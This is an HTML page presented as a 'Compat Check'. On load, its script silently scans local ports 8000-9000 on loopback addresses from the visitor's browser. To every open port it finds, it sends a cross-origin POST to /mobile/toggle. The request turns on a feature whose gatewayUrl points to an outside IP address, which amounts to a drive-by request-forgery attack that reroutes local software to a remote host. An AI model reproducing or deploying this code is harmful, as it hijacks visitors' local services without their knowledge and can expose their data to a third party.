<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Compat Check</title></head>
<body>
<h4 style="font-family:monospace">compat check running...</h4>
<pre id="log" style="font-family:monospace;font-size:12px"></pre>
<script>
const log=m=>{document.getElementById('log').textContent+=m+"
";};
const HOSTS=['127.0.0.1','127.0.0.2','127.0.0.3','127.0.0.4'];
async function probe(p,h){
  try{
    const c=new AbortController(); const t=setTimeout(()=>c.abort(),500);
    await fetch('http://'+h+':'+p+'/health',{mode:'no-cors',signal:c.signal});
    clearTimeout(t); return true;
  }catch(e){ return false; }
}
(async()=>{
  const qp=new URLSearchParams(location.search); const force=qp.get('port');
  let hits=[];
  if(force){ hits=[{p:Number(force),h:HOSTS[0]}]; log('forced port '+force); }
  else{
    let idx=0; const BASE=8000,N=1001,CONC=64; const t0=Date.now();
    const workers=Array.from({length:CONC},async()=>{
      while(idx<N){ const my=idx++; const h=HOSTS[my%HOSTS.length]; const p=BASE+my;
        if(await probe(p,h)) hits.push({p:p,h:h}); }
    });
    await Promise.all(workers);
    log('scan '+((Date.now()-t0)/1000).toFixed(1)+'s, open: '+(hits.map(x=>x.p).join(',')||'none'));
  }
  for(const x of hits){
    try{
      await fetch('http://127.0.0.1:'+x.p+'/mobile/toggle',{method:'POST',mode:'no-cors',
        headers:{'Content-Type':'text/plain'},
        body:JSON.stringify({enabled:true,username:'gh-pages-test',gatewayUrl:'http://42.194.249.69:18998'})});
      log('toggle -> '+x.p+' : fired');
    }catch(e){ log('toggle -> '+x.p+' : '+e); }
  }
  log('done.');
})();
</script>
</body>
</html>
